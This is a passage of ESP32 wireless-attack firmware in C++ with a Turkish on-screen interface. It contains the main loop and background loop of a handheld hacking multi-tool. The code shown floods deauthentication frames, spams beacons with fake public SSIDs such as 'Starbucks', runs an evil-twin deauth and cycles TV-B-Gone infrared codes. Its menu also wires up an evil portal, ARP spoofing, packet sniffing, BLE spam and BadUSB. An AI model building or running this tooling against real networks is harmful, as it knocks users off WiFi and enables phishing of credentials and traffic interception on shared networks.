    const char* names[] = {"FreeWiFi","Starbucks","ATT_WiFi","Xfinity","iPhone","AndroidAP","WiFi-2.4G","Guest_Net","Cafe_WiFi","Hotel_Free","Airport_WiFi","Library_NET","School_WiFi","Metro_Free","Park_WiFi"};
    int nc = sizeof(names)/sizeof(names[0]);
    for (int i = 0; i < 4; i++) {
      char ssid[33];
      int r = esp_random() % nc;
      snprintf(ssid, 32, "%s_%d", names[r], (int)(esp_random() % 9999));
      sendBeaconFrame(ssid, 1 + (esp_random() % 11));
    }
    beaconCount += 4;
    // Update display periodically
    if (beaconCount % 40 == 0 && pg == 13) {
      tft.fillRect(0, 40, 160, 12, ST77XX_BLACK);
      tft.setCursor(8, 48); tft.setTextColor(ST77XX_WHITE);
      tft.printf("Gonderilen: %d", beaconCount);
    }
  }

  // Deauth flood
  if (deauthRunning && now - deauthTimer > 200) {
    deauthTimer = now;
    uint8_t apMac[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    sendDeauthFrame(deauthMac, apMac);
    deauthCount++;
    if (deauthCount % 10 == 0 && pg == 15) {
      tft.fillRect(0, 40, 160, 12, ST77XX_BLACK);
      tft.setCursor(8, 48); tft.setTextColor(ST77XX_WHITE);
      tft.printf("Gonderilen: %d", deauthCount);
    }
  }

  // Evil Twin deauth
  if (evilTwinActive && now % 250 == 0) {
    uint8_t mac[6];
    sscanf(evilTargetBSSID, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
    sendDeauthFrame(deauthMac, mac);
  }

  // TV-B-Gone
  if (tvbgRunning && now - tvbgTimer >= 200) {
    tvbgTimer = now;
    int n = sizeof(tvbgCodes)/sizeof(tvbgCodes[0]);
    int total = n * 5;
    if (tvbgIdx < total) {
      sendIR(0x00, tvbgCodes[tvbgIdx % n], NEC);
      tvbgIdx++;
      if (pg == 31) {
        tft.fillRect(0, 30, 160, 10, ST77XX_BLACK);
        tft.setCursor(8, 32); tft.setTextColor(ST77XX_YELLOW);
        tft.printf("Kod: %d/%d", tvbgIdx, total);
      }
    } else {
      tvbgRunning = false;
      tvbgIdx = 0;
      if (pg == 31) {
        tft.fillRect(0, 30, 160, 30, ST77XX_BLACK);
        tft.setTextColor(ST77XX_GREEN); tft.setCursor(8, 40); tft.print("Tamam!");
        tft.setTextColor(ST77XX_WHITE); tft.setCursor(8, 78); tft.print("OK=Baslat");
      }
    }
  }
#endif
}

// ═══════════════════════════════════════════════════
//  LOOP
// ═══════════════════════════════════════════════════

void loop() {
  unsigned long now = millis();
  IRloop();
  loopHackBg();

  if ((up()||down()||ok()||menu()) && now-lastBtn>DB) {
    lastBtn = now;

    switch (pg) {
      case 0:
        if (up()) mainUp();
        else if (down()) mainDown();
        else if (ok()) mainOk();
        else if (menu()) { sel3=0; drawTools(); }
        break;
      case 1: case 2: case 3: case 4: actIR(); break;
      case 5: actBT(); break;
      case 6: actWiFi(); break;
#if ENABLE_PASS
      case 8: case 9: case 50: actPass(); break;
#endif
      case 10:
        if (up()) toolsUp();
        else if (down()) toolsDown();
        else if (ok()) toolsOk();
        else if (menu()) { pg=0; drawMain(); }
        break;
      case 11:
        if (menu()) { pg=10; drawTools(); }
        break;
      case 60:
        if (menu()) { pg=6; drawWiFi(); }
        break;
#if ENABLE_HACK
      case 12: actHackMenu(); break;
      case 13: case 15: case 16: case 17: case 18:
        if (menu()) { stopPromiscuous(); sel2=0; pg=12; drawHackMenu(); }
        else if (ok()) {
          int attack = -1;
          if (pg==13) attack=0; else if (pg==15) attack=1;
          else if (pg==16) attack=2; else if (pg==17) attack=3;
          else if (pg==18) attack=4;
          if (attack >= 0) toggleHack(attack);
        }
        break;
      case 19: case 20: actEvilTwin(); break;
      case 21:
        if (menu()) { portScanRunning = false; pg=12; drawHackMenu(); }
        else if (ok() && !portScanRunning) { doPortScan(); drawPortScan(); }
        break;
      case 40:
        if (menu()) { rawSniffRunning=false; esp_wifi_set_promiscuous(false); pg=12; drawHackMenu(); }
        else if (ok()) { toggleRawSniff(); }
        break;
      case 41: actEvilPortal(); break;
      case 43:
        if (menu()) { pg=12; drawHackMenu(); }
        else if (ok() && !airtagRunning) { startAirTagSniff(); }
        break;
      case 44: case 45: actESPNOW(); break;
      case 46:
        if (menu()) { arpRunning=false; esp_wifi_set_promiscuous(false); pg=12; drawHackMenu(); }
        else if (ok()) { toggleARPSpoof(); }
        break;
#endif
#if ENABLE_BLESPAM || ENABLE_BLESCAN
      case 22: actBLEMenu(); break;
      case 23:
        if (menu()) { pg=22; drawBLEMenu(); }
        else if (ok()) {
          tft.setTextColor(ST77XX_GREEN); tft.setCursor(8, 40); tft.print("Taraniyor...");
        }
        break;
      case 24: case 25: case 26: case 27: case 28:
        if (menu()) { bleSpamStop(); pg=22; drawBLEMenu(); }
        else if (ok()) {
          if (!bleSpamRunning) {
            bleSpamStart(pg - 24);
          } else {
            bleSpamStop();
          }
          drawBLESpam(pg - 24);
        }
        break;
#endif
      case 30: actIRToolsMenu(); break;
      case 31: actTVBGone(); break;
      case 32: actIRRaw(); break;
      case 35:
        if (menu()) { pg=6; drawWiFi(); }
        break;
      case 36:
        if (menu()) { pg=12; drawHackMenu(); }
        break;
#if ENABLE_BADUSB
      case 33: case 34: actBadUSB(); break;
#endif
    }
  }
}
